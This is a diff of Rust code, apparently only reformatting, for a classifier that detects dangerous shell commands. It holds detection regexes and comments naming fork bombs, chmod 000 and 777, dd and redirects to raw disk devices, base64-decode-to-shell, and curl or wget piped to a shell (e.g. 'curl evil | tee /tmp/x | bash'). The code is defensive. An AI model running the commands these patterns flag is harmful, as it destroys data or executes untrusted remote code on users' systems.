@@ -62,9 +62,8 @@ const DESTRUCTIVE_COMMAND_TOKENS: &[&str] = &[
     "blkdiscard",
 ];
 
-static FORK_BOMB_CLASSIC: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*[;&]+\s*\}\s*;\s*:").unwrap()
-});
+static FORK_BOMB_CLASSIC: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*[;&]+\s*\}\s*;\s*:").unwrap());
 
 // Rust regex has no backreferences, so we cannot enforce "same name in all
 // three positions" like the TS classifier does. Instead, match the structural
@@ -75,21 +74,17 @@ static FORK_BOMB_NAMED: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"\b\w+\s*\(\s*\)\s*\{\s*\w+\s*\|\s*\w+\s*[;&]+\s*\}\s*;\s*\w+").unwrap()
 });
 
-static CHMOD_OBLITERATE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\bchmod\s+(?:-R\s+)?0{3,4}\b").unwrap()
-});
+static CHMOD_OBLITERATE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\bchmod\s+(?:-R\s+)?0{3,4}\b").unwrap());
 
-static CHMOD_WORLD_WRITABLE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\bchmod\s+-R\s+777\b").unwrap()
-});
+static CHMOD_WORLD_WRITABLE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\bchmod\s+-R\s+777\b").unwrap());
 
-static DD_TO_DEVICE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\bdd\s+[^;&|]*(?:of=/dev/|if=/dev/)").unwrap()
-});
+static DD_TO_DEVICE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\bdd\s+[^;&|]*(?:of=/dev/|if=/dev/)").unwrap());
 
-static REDIRECT_TO_DEVICE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r">\s*/dev/(?:sd|disk|rdisk|nvme|mem|kmem)").unwrap()
-});
+static REDIRECT_TO_DEVICE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r">\s*/dev/(?:sd|disk|rdisk|nvme|mem|kmem)").unwrap());
 
 // `base64 -d … | sh` — decode-and-execute, a classic obfuscated dropper.
 static BASE64_DECODE_TO_SHELL: Lazy<Regex> = Lazy::new(|| {
@@ -100,9 +95,8 @@ static BASE64_DECODE_TO_SHELL: Lazy<Regex> = Lazy::new(|| {
 // `eval` of a downloaded payload, e.g. `eval "$(curl evil)"` or `eval `wget …``.
 // Bare `eval` is common in benign scripts (`eval "$(ssh-agent)"`), so we only
 // trip when the substitution contains a network downloader.
-static EVAL_OF_DOWNLOAD: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"\beval\b[^\n]*[$`]\(?[^\n]*\b(?:curl|wget|fetch|aria2c)\b").unwrap()
-});
+static EVAL_OF_DOWNLOAD: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"\beval\b[^\n]*[$`]\(?[^\n]*\b(?:curl|wget|fetch|aria2c)\b").unwrap());
 
 // `curl … | sh` / `wget … | bash` etc. Includes intermediate `tee`/`xargs` to
 // catch obfuscation like `curl evil | tee /tmp/x | bash`.
@@ -314,7 +308,11 @@ fn has_unsafe_rm_target(rest_after_rm_flags: &str) -> bool {
             return true;
         }
         let normalized = stripped.trim_end_matches('/');
-        let candidate = if normalized.is_empty() { "/" } else { normalized };
+        let candidate = if normalized.is_empty() {
+            "/"
+        } else {
+            normalized
+        };
         if matches!(candidate, "/" | "~" | "." | ".." | "*" | "/*") {
             return true;
         }
